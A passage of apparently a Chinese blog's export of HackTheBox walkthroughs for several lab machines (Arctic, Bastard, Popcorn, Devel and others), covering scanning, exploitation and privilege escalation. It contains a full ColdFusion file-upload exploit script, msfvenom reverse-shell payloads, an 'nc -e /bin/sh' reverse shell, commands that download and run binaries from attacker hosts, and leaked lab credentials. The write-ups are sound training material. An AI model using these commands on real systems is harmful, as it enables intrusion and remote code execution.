2=Bcrypt/AES]) is 0 for all loaded hashesCost 2 (iteration count) is 1 for all loaded hashesWill run 2 OpenMP threadsNote: This format may emit false positives, so it will keep trying even afterfinding a possible candidate.Press 'q' or Ctrl-C to abort, almost any other key for statushunter (id_rsa)1g 0:00:00:04 DONE (2020-12-10 05:24) 0.2024g/s 2903Kp/s 2903Kc/s 2903KC/sa6_123..*7¡Vamos!Session completed nhttpd.conf12345678910111213141516171819202122232425262728293031# MAIN [MANDATORY]servername traverxec.htbserverlisten *serveradmin david@traverxec.htbserverroot &#x2F;var&#x2F;nostromoservermimes conf&#x2F;mimesdocroot &#x2F;var&#x2F;nostromo&#x2F;htdocsdocindex index.html# LOGS [OPTIONAL]logpid logs&#x2F;nhttpd.pid# SETUID [RECOMMENDED]user www-data# BASIC AUTHENTICATION [OPTIONAL]htaccess .htaccesshtpasswd &#x2F;var&#x2F;nostromo&#x2F;conf&#x2F;.htpasswd# ALIASES [OPTIONAL]&#x2F;icons &#x2F;var&#x2F;nostromo&#x2F;icons# HOMEDIRS [OPTIONAL]homedirs &#x2F;homehomedirs_public public_www user flag然后使用得到的密码登录david，用户目录得到user.txt: 提权信息bin目录有个server-stats.sh，里面显示可以sudo调用journalctl,直接运行的话可以看出内部应该是用到了less： 利用方式： https://gtfobins.github.io/gtfobins/journalctl/#sudo server-stats.sh12345678910#!/bin/bashcat /home/david/bin/server-stats.headecho \"Load: `/usr/bin/uptime`\"echo \" \"echo \"Open nhttpd sockets: `/usr/bin/ss -H sport = 80 | /usr/bin/wc -l`\"echo \"Files in the docroot: `/usr/bin/find /var/nostromo/htdocs/ | /usr/bin/wc -l`\"echo \" \"echo \"Last 5 journal log lines:\"/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service | /usr/bin/cat 提权 &amp; root flag直接输入!后运行bash，得到root,读取root.txt: 参考资料 nostromo 1.9.6 - Remote Code Execution - Multiple remote Exploithttps://www.exploit-db.com/exploits/47837 theRealFr13nd/CVE-2019-16278-Nostromo_1.9.6-RCE: Python script to exploit RCE in Nostromo nhttpd &lt;= 1.9.6.https://github.com/theRealFr13nd/CVE-2019-16278-Nostromo_1.9.6-RCE https://gtfobins.github.io/gtfobins/journalctl/#sudo https://www.hackthebox.eu/home/machines/writeup/217 HackTheBox - Traverxec - YouTubehttps://www.youtube.com/watch?v=6_C9ShH9v2w&amp;feature=youtu.be&amp;ab_channel=IppSec","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"Arctic - HackTheBox","slug":"Arctic-HackTheBox","date":"2020-02-02T07:02:36.000Z","updated":"2020-12-22T07:03:58.665Z","comments":true,"path":"2020/02/02/Arctic-HackTheBox/","link":"","permalink":"https://darkwing.moe/2020/02/02/Arctic-HackTheBox/","excerpt":"","text":"基本信息 https://www.hackthebox.eu/home/machines/profile/9 10.10.10.11 端口扫描1234567891011121314$ nmap -sC -sV -Pn 10.10.10.11Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-22 13:58 CSTNmap scan report for 10.10.10.11Host is up (0.068s latency).Not shown: 997 filtered portsPORT STATE SERVICE VERSION135/tcp open msrpc Microsoft Windows RPC8500/tcp open fmtp?49154/tcp open msrpc Microsoft Windows RPCService Info: OS: Windows; CPE: cpe:/o:microsoft:windowsService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 224.15 seconds 8500直接访问是两个目录，/CFIDE/administrator目录是登录页面，根据页面信息是ColdFusion 8： ColdFusion这个版本的ColdFusion有两种打法，一个是直接未授权上传jsp后去访问出发shell，另一种是任意文件读取拿到密码hash后解出来密码，登录进去上传shell： Adobe ColdFusion - Directory Traversal - Multiple remote Exploithttps://www.exploit-db.com/exploits/14641 ColdFusion 8.0.1 - Arbitrary File Upload / Execution (Metasploit) - CFM webapps Exploithttps://www.exploit-db.com/exploits/16788 任意文件读取 http://10.10.10.11:8500/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../ColdFusion8/lib/password.properties%00en 读取出密码hash，解出来密码,用户名就是admin： 另外如果解不出来明文密码，也可以直接使用hash生成登录用hash： 1hex_hmac_sha1(document.loginform.salt.value, '2F635F6D20E3FDE0C53075A84B68FB07DCEC9B03'); 登录进去,add new scheduled/task那里可以上传jsp，然后再去前面的目录里找到上传的文件访问触发(网页加载太慢了，用另一种方式打了)： 任意文件上传/rce论坛里给了脚本： https://forum.hackthebox.eu/discussion/116/python-coldfusion-8-0-1-arbitrary-file-upload 123456msfvenom -p java&#x2F;jsp_shell_reverse_tcp lhost&#x3D;10.10.14.6 lport&#x3D;4445 -f raw &gt; miao.jsp$ python exp.py 10.10.10.11 8500 .&#x2F;miao.jspSending payload...Successfully uploaded payload!Find it at http:&#x2F;&#x2F;10.10.10.11:8500&#x2F;userfiles&#x2F;file&#x2F;exploit.jsp 然后去访问触发，getshell： exp.py1234567891011121314151617181920212223242526272829303132333435363738394041424344#!/usr/bin/python# Exploit Title: ColdFusion 8.0.1 - Arbitrary File Upload# Date: 2017-10-16# Exploit Author: Alexander Reid# Vendor Homepage: http://www.adobe.com/products/coldfusion-family.html# Version: ColdFusion 8.0.1# CVE: CVE-2009-2265## Description:# A standalone proof of concept that demonstrates an arbitrary file upload vulnerability in ColdFusion 8.0.1# Uploads the specified jsp file to the remote server.## Usage: ./exploit.py &lt;target ip&gt; &lt;target port&gt; [/path/to/coldfusion] &lt;/path/to/payload.jsp&gt;# Example: ./exploit.py 127.0.0.1 8500 /home/arrexel/shell.jspimport requests, systry: ip = sys.argv[1] port = sys.argv[2] if len(sys.argv) == 5: path = sys.argv[3] with open(sys.argv[4], 'r') as payload: body=payload.read() else: path = \"\" with open(sys.argv[3], 'r') as payload: body=payload.read()except IndexError: print 'Usage: ./exploit.py &lt;target ip/hostname&gt; &lt;target port&gt; [/path/to/coldfusion] &lt;/path/to/payload.jsp&gt;' print 'Example: ./exploit.py example.com 8500 /home/arrexel/shell.jsp' sys.exit(-1)basepath = \"http://\" + ip + \":\" + port + pathprint 'Sending payload...'try: req = requests.post(basepath + \"/CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/upload.cfm?Command=FileUpload&amp;Type=File&amp;CurrentFolder=/exploit.jsp%00\", files=&#123;'newfile': ('exploit.txt', body, 'application/x-java-archive')&#125;, timeout=30) if req.status_code == 200: print 'Successfully uploaded payload!\\nFind it at ' + basepath + '/userfiles/file/exploit.jsp' else: print 'Failed to upload payload... ' + str(req.status_code) + ' ' + req.reasonexcept requests.Timeout: print 'Failed to upload payload... Request timed out' user flag当前shell用户桌面得到user.txt: 提权信息直接根据systeminfo信息分析提权建议，给出很多，这里选择10-059: https://github.com/egre55/windows-kernel-exploits/blob/master/MS10-059:%20Chimichurri/Compiled/Chimichurri.exe 提权就是把exp传上去执行(直接加载meterpreter然后执行提权模块的话非常快)： 12345echo $webclient = New-Object System.Net.WebClient &gt;&gt;miao.ps1echo $url = \"http://10.10.14.6:7777/Chimichurri.exe\" &gt;&gt;miao.ps1echo $file = \"exploit.exe\" &gt;&gt;miao.ps1echo $webclient.DownloadFile($url,$file) &gt;&gt;miao.ps1powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File miao.ps1 root flag然后直接Administrator用户桌面得到root.txt: 参考资料 Adobe ColdFusion - Directory Traversal - Multiple remote Exploithttps://www.exploit-db.com/exploits/14641 ColdFusion 8.0.1 - Arbitrary File Upload / Execution (Metasploit) - CFM webapps Exploithttps://www.exploit-db.com/exploits/16788 https://forum.hackthebox.eu/discussion/116/python-coldfusion-8-0-1-arbitrary-file-upload https://github.com/egre55/windows-kernel-exploits/blob/master/MS10-059:%20Chimichurri/Compiled/Chimichurri.exe https://www.hackthebox.eu/home/machines/writeup/9 HTB: Arctic | 0xdf hacks stuffhttps://0xdf.gitlab.io/2020/05/19/htb-arctic.html#priv-tolis--system HackTheBox - Arctic - YouTubehttps://www.youtube.com/watch?v=e9lVyFH7-4o&amp;feature=youtu.be&amp;ab_channel=IppSec","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"Bastard - HackTheBox","slug":"Bastard-HackTheBox","date":"2020-01-31T09:05:43.000Z","updated":"2020-12-14T09:06:43.871Z","comments":true,"path":"2020/01/31/Bastard-HackTheBox/","link":"","permalink":"https://darkwing.moe/2020/01/31/Bastard-HackTheBox/","excerpt":"","text":"基本信息 https://www.hackthebox.eu/home/machines/profile/7 10.10.10.9 端口扫描80,135,49154: 123456789101112131415161718$ nmap -sC -sV 10.10.10.9Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-14 15:25 CSTNmap scan report for 10.10.10.9Host is up (0.075s latency).Not shown: 997 filtered portsPORT STATE SERVICE VERSION80/tcp open http Microsoft IIS httpd 7.5|_http-generator: Drupal 7 (http://drupal.org)| http-methods:|_ Potentially risky methods: TRACE|_http-server-header: Microsoft-IIS/7.5|_http-title: Welcome to 10.10.10.9 | 10.10.10.9135/tcp open msrpc Microsoft Windows RPC49154/tcp open msrpc Microsoft Windows RPCService Info: OS: Windows; CPE: cpe:/o:microsoft:windowsService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 113.73 seconds 80是Drupal： 直接访问默认的CHANGELOG.txt，可以知道版本是7.54: Drupal exploit搜索发现相关漏洞： Drupal 7.x Module Services - Remote Code Execution - PHP webapps Exploithttps://www.exploit-db.com/exploits/41564 exp修改相关参数，path那个简单扫一下就知道是rest： webshellexp一键打，getshell： session 劫持exp也给我们生成了session，直接修改后即可访问Drupal管理页面： php代码执行在模块里启用php： 然后去添加文章，选择php，保存后预览： 成功执行： AntSwordshell换蚁剑方便操作： user flag然后直接当前权限shell在dimitris用户桌面得到user.txt: 提权信息 使用脚本自动化分析： https://github.com/rasta-mouse/Sherlock/blob/master/Sherlock.ps1 1IEX (New-Object Net.WebClient).DownloadString(&#39;http:&#x2F;&#x2F;10.10.14.8:7777&#x2F;Sherlock.ps1&#39;) Ms15-051 提权 &amp; root flag https://github.com/SecWiki/windows-kernel-exploits/raw/master/MS15-051/MS15-051-KB3045171.zip 1certutil -urlcache -f http://10.10.14.8:7777/ms15051x64.exe ms15051x64.exe 蚁剑交互shell不太行，前面直接用nc反弹shell的话会方便点，这里是蚁剑执行ms15051x64.exe夹在system权限的meterpreter，读取root.txt: 参考资料 Drupal 7.x Module Services - Remote Code Execution - PHP webapps Exploithttps://www.exploit-db.com/exploits/41564 https://github.com/rasta-mouse/Sherlock/blob/master/Sherlock.ps1 https://github.com/SecWiki/windows-kernel-exploits/raw/master/MS15-051/MS15-051-KB3045171.zip https://www.hackthebox.eu/home/machines/writeup/7 HackTheBox - Bastard - YouTubehttps://www.youtube.com/watch?v=lP-E5vmZNC0&amp;feature=youtu.be&amp;ab_channel=IppSec","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"Optimum - HackTheBox","slug":"Optimum-HackTheBox","date":"2020-01-28T06:23:46.000Z","updated":"2020-12-08T06:25:02.672Z","comments":true,"path":"2020/01/28/Optimum-HackTheBox/","link":"","permalink":"https://darkwing.moe/2020/01/28/Optimum-HackTheBox/","excerpt":"","text":"基本信息 https://www.hackthebox.eu/home/machines/profile/6 10.10.10.8 端口扫描只有一个80: 12345678910111213$ nmap -sC -sV 10.10.10.8Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-08 14:00 CSTNmap scan report for 10.10.10.8Host is up (0.071s latency).Not shown: 999 filtered portsPORT STATE SERVICE VERSION80/tcp open http HttpFileServer httpd 2.3|_http-server-header: HFS 2.3|_http-title: HFS /Service Info: OS: Windows; CPE: cpe:/o:microsoft:windowsService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 56.89 seconds 80是一个HFS 2.3: 搜索得到相关漏洞： Rejetto HttpFileServer 2.3.x - Remote Command Execution (3) - Windows webapps Exploithttps://www.exploit-db.com/exploits/49125 CVE-2014-6287直接msf一键打： 12345678910111213use exploit&#x2F;windows&#x2F;http&#x2F;rejetto_hfs_execset rhosts 10.10.10.8set lhost 10.10.14.5exploitmeterpreter &gt; sysinfoComputer : OPTIMUMOS : Windows 2012 R2 (6.3 Build 9600).Architecture : x64System Language : el_GRDomain : HTBLogged On Users : 1Meterpreter : x86&#x2F;windows user flag直接当前用户桌面得到user.txt: 提权信息直接msf收集信息： 1use post&#x2F;multi&#x2F;recon&#x2F;local_exploit_suggester 得到结果，ms16-032: ms16_032还是msf一键打，打到system shell： 1use exploit&#x2F;windows&#x2F;local&#x2F;ms16_032_secondary_logon_handle_privesc root flagAdministrator用户桌面得到root.txt: 参考资料 Rejetto HttpFileServer 2.3.x - Remote Command Execution (3) - Windows webapps Exploithttps://www.exploit-db.com/exploits/49125 https://www.hackthebox.eu/home/machines/writeup/6 HackTheBox - Optimum - YouTubehttps://www.youtube.com/watch?v=kWTnVBIpNsE&amp;feature=youtu.be&amp;ab_channel=IppSec","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"Beep - HackTheBox","slug":"Beep-HackTheBox","date":"2020-01-26T05:45:54.000Z","updated":"2020-12-03T05:46:57.694Z","comments":true,"path":"2020/01/26/Beep-HackTheBox/","link":"","permalink":"https://darkwing.moe/2020/01/26/Beep-HackTheBox/","excerpt":"","text":"基本信息 https://www.hackthebox.eu/home/machines/profile/5 10.10.10.7 端口扫描很多端口，基本都有已知漏洞，打法非常多： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071$ nmap -sC -sV 10.10.10.7Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-03 13:31 CSTNmap scan report for 10.10.10.7Host is up (0.068s latency).Not shown: 988 closed portsPORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 4.3 (protocol 2.0)| ssh-hostkey:| 1024 ad:ee:5a:bb:69:37:fb:27:af:b8:30:72:a0:f9:6f:53 (DSA)|_ 2048 bc:c6:73:59:13:a1:8a:4b:55:07:50:f6:65:1d:6d:0d (RSA)25/tcp open smtp Postfix smtpd|_smtp-commands: beep.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, ENHANCEDSTATUSCODES, 8BITMIME, DSN,80/tcp open http Apache httpd 2.2.3|_http-server-header: Apache/2.2.3 (CentOS)|_http-title: Did not follow redirect to https://10.10.10.7/110/tcp open pop3 Cyrus pop3d 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4|_pop3-capabilities: AUTH-RESP-CODE EXPIRE(NEVER) UIDL STLS APOP PIPELINING LOGIN-DELAY(0) RESP-CODES IMPLEMENTATION(Cyrus POP3 server v2) USER TOP|_ssl-cert: ERROR: Script execution failed (use -d to debug)|_ssl-date: ERROR: Script execution failed (use -d to debug)|_sslv2: ERROR: Script execution failed (use -d to debug)|_tls-alpn: ERROR: Script execution failed (use -d to debug)|_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug)111/tcp open rpcbind 2 (RPC #100000)| rpcinfo:| program version port/proto service| 100000 2 111/tcp rpcbind| 100000 2 111/udp rpcbind| 100024 1 875/udp status|_ 100024 1 878/tcp status143/tcp open imap Cyrus imapd 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4|_imap-capabilities: NO ANNOTATEMORE CATENATE BINARY NAMESPACE QUOTA SORT=MODSEQ ATOMIC MULTIAPPEND X-NETSCAPE ID OK IMAP4rev1 Completed MAILBOX-REFERRALS IDLE THREAD=REFERENCES URLAUTHA0001 RIGHTS=kxte ACL SORT UIDPLUS LITERAL+ LISTEXT CONDSTORE THREAD=ORDEREDSUBJECT IMAP4 LIST-SUBSCRIBED STARTTLS UNSELECT RENAME CHILDREN|_imap-ntlm-info: ERROR: Script execution failed (use -d to debug)|_ssl-cert: ERROR: Script execution failed (use -d to debug)|_ssl-date: ERROR: Script execution failed (use -d to debug)|_sslv2: ERROR: Script execution failed (use -d to debug)|_tls-alpn: ERROR: Script execution failed (use -d to debug)|_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug)443/tcp open ssl/http Apache httpd 2.2.3 ((CentOS))| http-robots.txt: 1 disallowed entry|_/|_http-server-header: Apache/2.2.3 (CentOS)|_http-title: Elastix - Login page| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--| Not valid before: 2017-04-07T08:22:08|_Not valid after: 2018-04-07T08:22:08|_ssl-date: 2020-12-03T06:34:39+00:00; +59m59s from scanner time.993/tcp open ssl/imap Cyrus imapd|_imap-capabilities: CAPABILITY995/tcp open pop3 Cyrus pop3d|_ssl-cert: ERROR: Script execution failed (use -d to debug)|_ssl-date: ERROR: Script execution failed (use -d to debug)|_ssl-known-key: ERROR: Script execution failed (use -d to debug)|_sslv2: ERROR: Script execution failed (use -d to debug)|_tls-alpn: ERROR: Script execution failed (use -d to debug)|_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug)3306/tcp open mysql MySQL (unauthorized)|_ssl-cert: ERROR: Script execution failed (use -d to debug)|_ssl-date: ERROR: Script execution failed (use -d to debug)|_sslv2: ERROR: Script execution failed (use -d to debug)|_tls-alpn: ERROR: Script execution failed (use -d to debug)|_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug)4445/tcp open upnotifyp?10000/tcp open http MiniServ 1.570 (Webmin httpd)|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).Service Info: Hosts: beep.localdomain, 127.0.0.1, example.comHost script results:|_clock-skew: 59m58sService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 325.50 seconds web直接访问80会跳到443，是一个elastix： Elastix搜索相关漏洞，这里用到的是： Elastix 2.2.0 - ‘graph.php’ Local File Inclusion - PHP webapps Exploithttps://www.exploit-db.com/exploits/37637 直接读取配置文件，获得账号密码： 12345678910AMPDBHOST&#x3D;localhostAMPDBENGINE&#x3D;mysql# AMPDBNAME&#x3D;asteriskAMPDBUSER&#x3D;asteriskuser# AMPDBPASS&#x3D;amp109AMPDBPASS&#x3D;jEhdIekWmdjEAMPENGINE&#x3D;asteriskAMPMGRUSER&#x3D;admin#AMPMGRPASS&#x3D;amp111AMPMGRPASS&#x3D;jEhdIekWmdjE root &amp; flags密码复用，root密码就是配置文件里的密码，直接ssh连接读取user.txt和root.txt: 参考资料 Elastix 2.2.0 - ‘graph.php’ Local File Inclusion - PHP webapps Exploithttps://www.exploit-db.com/exploits/37637 https://www.hackthebox.eu/home/machines/writeup/5 HackTheBox - Beep - YouTubehttps://www.youtube.com/watch?v=XJmBpOd__N8&amp;feature=youtu.be&amp;ab_channel=IppSec","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"Devel - HackTheBox","slug":"Devel-HackTheBox","date":"2020-01-25T06:50:57.000Z","updated":"2020-12-01T06:52:24.206Z","comments":true,"path":"2020/01/25/Devel-HackTheBox/","link":"","permalink":"https://darkwing.moe/2020/01/25/Devel-HackTheBox/","excerpt":"","text":"基本信息 https://www.hackthebox.eu/home/machines/profile/3 10.10.10.5 端口扫描21和80: 12345678910111213141516171819202122232425$ nmap -sC -sV 10.10.10.5Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-01 14:23 CSTNmap scan report for 10.10.10.5Host is up (0.079s latency).Not shown: 998 filtered portsPORT STATE SERVICE VERSION21/tcp open ftp Microsoft ftpd| ftp-anon: Anonymous FTP login allowed (FTP code 230)| 12-03-20 07:18PM 2829 1.aspx| 03-18-17 01:06AM &lt;DIR&gt; aspnet_client| 03-17-17 04:37PM 689 iisstart.htm| 12-03-20 08:10PM 38857 shell.asp| 12-03-20 08:17PM 38443 shell.aspx|_03-17-17 04:37PM 184946 welcome.png| ftp-syst:|_ SYST: Windows_NT80/tcp open http Microsoft IIS httpd 7.5| http-methods:|_ Potentially risky methods: TRACE|_http-server-header: Microsoft-IIS/7.5|_http-title: IIS7Service Info: OS: Windows; CPE: cpe:/o:microsoft:windowsService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 57.90 seconds 80IIS默认页面： 21 ftpftp可以匿名访问，就直接是80的web，aspx是别人传的： FTP getshell那就是直接FTP写webshell,直接msf生成就可以： 1msfvenom -p windows/meterpreter/reverse_tcp -f aspx -o miao.aspx LHOST=10.10.14.12 LPORT=4444 FTP上传之后去80的web访问触发，得到web用户shell： 提权 直接运行msf的提权建议模块： 1post&#x2F;multi&#x2F;recon&#x2F;local_exploit_suggester 给出很多建议，随意选一个就可以： exp打到system shell： flags然后直接去读取user.txt和root.txt就可以： 12type c:\\Users\\babis\\Desktop\\user.txt.txttype c:\\Users\\Administrator\\Desktop\\root.txt.txt 参考资料 https://www.hackthebox.eu/home/machines/writeup/3 HackTheBox - Devel - YouTubehttps://www.youtube.com/watch?v=2LNyAbroZUk&amp;feature=youtu.be&amp;ab_channel=IppSec","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"Popcorn - HackTheBox","slug":"Popcorn-HackTheBox","date":"2020-01-23T07:19:06.000Z","updated":"2020-11-30T07:20:54.422Z","comments":true,"path":"2020/01/23/Popcorn-HackTheBox/","link":"","permalink":"https://darkwing.moe/2020/01/23/Popcorn-HackTheBox/","excerpt":"","text":"基本信息 https://www.hackthebox.eu/home/machines/profile/4 10.10.10.6 端口扫描常规22和80： 123456789101112131415161718$ nmap -sC -sV -Pn 10.10.10.6Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.Starting Nmap 7.91 ( https://nmap.org ) at 2020-11-30 14:31 CSTNmap scan report for 10.10.10.6Host is up (0.068s latency).Not shown: 998 closed portsPORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 5.1p1 Debian 6ubuntu2 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:| 1024 3e:c8:1b:15:21:15:50:ec:6e:63:bc:c5:6b:80:7b:38 (DSA)|_ 2048 aa:1f:79:21:b8:42:f4:8a:38:bd:b8:05:ef:1a:07:4d (RSA)80/tcp open http Apache httpd 2.2.12 ((Ubuntu))|_http-server-header: Apache/2.2.12 (Ubuntu)|_http-title: Site doesn't have a title (text/html).Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 25.53 seconds 80直接访问80是apache默认页面，那就继续扫目录： 目录扫描扫到一些目录，一些提示信息和下一步利用点： 123456gobuster dir -u http://10.10.10.6 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50/index (Status: 200)/test (Status: 200)/torrent (Status: 301)/rename (Status: 301) testPhpinfo: rename1Renamer API Syntax: index.php?filename&#x3D;old_file_path_an_name&amp;newfilename&#x3D;new_file_path_and_name torrent一个torrent站点： torrent 随意注册登录，存在上传功能,但需要torrent文件： 随意上传torrent文件后，进入编辑页面，screenshot处可以上传截图： 上传完之后可以在detail页面得到文件路径： 1http:&#x2F;&#x2F;10.10.10.6&#x2F;torrent&#x2F;upload&#x2F;e6d4196be6438a6a57e1c3056598a7a974c9027f.jpg 上传绕过修改文件名为php，发现details页面也显示为php： webshell那就直接修改内容为php webshell上传，getshell： reverse shell 服务器上有nc，直接reverse shell方便操作： 123http://10.10.10.6/torrent/upload/e6d4196be6438a6a57e1c3056598a7a974c9027f.php?cmd=nc%20-e%20/bin/sh%2010.10.14.6%204445python -c 'import pty; pty.spawn(\"/bin/sh\")' user flag然后看下用户，在george目录得到user.txt: 提权信息有一个motd.legal-displayed文件, 搜索发现相关漏洞： Linux PAM 1.1.0 (Ubuntu 9.10/10.04) - MOTD File Tampering Privilege Escalation (2) - Linux local Exploithttps://www.exploit-db.com/exploits/14339 提权 &amp; root flag就是exp一键打.root目录得到root.txt： 123wget http://10.10.14.6:9999/exp.shchmod +x exp.sh./exp.sh 参考资料 Linux PAM 1.1.0 (Ubuntu 9.10/10.04) - MOTD File Tampering Privilege Escalation (2) - Linux local Exploithttps://www.exploit-db.com/exploits/14339 https://www.hackthebox.eu/home/machines/writeup/4 HackTheBox - Popcorn - YouTubehttps://www.youtube.com/watch?v=NMGsnPSm8iw&amp;feature=youtu.be&amp;ab_channel=IppSec","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"Legacy - HackTheBox","slug":"Legacy-HackTheBox","date":"2020-01-20T06:11:57.000Z","updated":"2020-11-27T06:13:07.723Z","comments":true,"path":"2020/01/20/Legacy-HackTheBox/","link":"","permalink":"https://darkwing.moe/2020/01/20/Legacy-HackTheBox/","excerpt":"","text":"基本信息 https://www.hackthebox.eu/home/machines/profile/2 10.10.10.4 端口扫描XP系统。。。 12345678910111213141516171819202122232425262728293031$ nmap -sC -sV -Pn 10.10.10.4Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.Starting Nmap 7.91 ( https://nmap.org ) at 2020-11-27 14:03 CSTNmap scan report for 10.10.10.4Host is up (0.068s latency).Not shown: 997 filtered portsPORT STATE SERVICE VERSION139/tcp open netbios-ssn Microsoft Windows netbios-ssn445/tcp open microsoft-ds Windows XP microsoft-ds3389/tcp closed ms-wbt-serverService Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xpHost script results:|_clock-skew: mean: -4h00m00s, deviation: 1h24m51s, median: -5h00m00s|_nbstat: NetBIOS name: LEGACY, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 00:50:56:b9:99:86 (VMware)| smb-os-discovery:| OS: Windows XP (Windows 2000 LAN Manager)| OS CPE: cpe:/o:microsoft:windows_xp::-| Computer name: legacy| NetBIOS computer name: LEGACY\\x00| Workgroup: HTB\\x00|_ System time: 2020-11-27T05:04:48+02:00| smb-security-mode:| account_used: guest| authentication_level: user| challenge_response: supported|_ message_signing: disabled (dangerous, but default)|_smb2-time: Protocol negotiation failed (SMB2)Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 102.37 seconds ms08-067经典的08-067一键打，没什么可说的： flags两个flag分别在john和Administrator用户桌面，直接读： 参考资料 https://www.hackthebox.eu/home/machines/writeup/2","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"Forest - HackTheBox","slug":"Forest-HackTheBox","date":"2020-01-19T07:01:28.000Z","updated":"2020-11-10T07:07:46.158Z","comments":true,"path":"2020/01/19/Forest-HackTheBox/","link":"","permalink":"https://darkwing.moe/2020/01/19/Forest-HackTheBox/","excerpt":"","text":"基本信息 https://www.hackthebox.eu/home/machines/profile/212 10.10.10.161 端口扫描windows域服务器： 12345678910111213141516171819202122232425262728293031323334353637383940414243$ nmap -sC -sV 10.10.10.161Starting Nmap 7.91 ( https://nmap.org ) at 2020-11-10 13:27 CSTNmap scan report for 10.10.10.161Host is up (0.068s latency).Not shown: 989 closed portsPORT STATE SERVICE VERSION53/tcp open domain Simple DNS Plus88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2020-11-10 05:34:46Z)135/tcp open msrpc Microsoft Windows RPC139/tcp open netbios-ssn Microsoft Windows netbios-ssn389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)445/tcp open microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)464/tcp open kpasswd5?593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0636/tcp open tcpwrapped3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)3269/tcp open tcpwrappedService Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windowsHost script results:|_clock-skew: mean: 2h46m50s, deviation: 4h37m09s, median: 6m48s| smb-os-discovery:| OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)| Computer name: FOREST| NetBIOS computer name: FOREST\\x00| Domain name: htb.local| Forest name: htb.local| FQDN: FOREST.htb.local|_ System time: 2020-11-09T21:34:54-08:00| smb-security-mode:| account_used: guest| authentication_level: user| challenge_response: supported|_ message_signing: required| smb2-security-mode:| 2.02:|_ Message signing enabled and required| smb2-time:| date: 2020-11-10T05:34:51|_ start_date: 2020-11-10T03:18:44Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 27.57 seconds rpcclientrpc可以匿名登录，枚举信息： 123rpcclient -U \"\" 10.10.10.161Enter WORKGROUP\\'s password:rpcclient $&gt; enumdomusers123456789101112131415161718192021222324252627282930313233rpcclient $&gt; enumdomusersuser:[Administrator] rid:[0x1f4]user:[Guest] rid:[0x1f5]user:[krbtgt] rid:[0x1f6]user:[DefaultAccount] rid:[0x1f7]user:[$331000-VK4ADACQNUCA] rid:[0x463]user:[SM_2c8eef0a09b545acb] rid:[0x464]user:[SM_ca8c2ed5bdab4dc9b] rid:[0x465]user:[SM_75a538d3025e4db9a] rid:[0x466]user:[SM_681f53d4942840e18] rid:[0x467]user:[SM_1b41c9286325456bb] rid:[0x468]user:[SM_9b69f1b9d2cc45549] rid:[0x469]user:[SM_7c96b981967141ebb] rid:[0x46a]user:[SM_c75ee099d0a64c91b] rid:[0x46b]user:[SM_1ffab36a2f5f479cb] 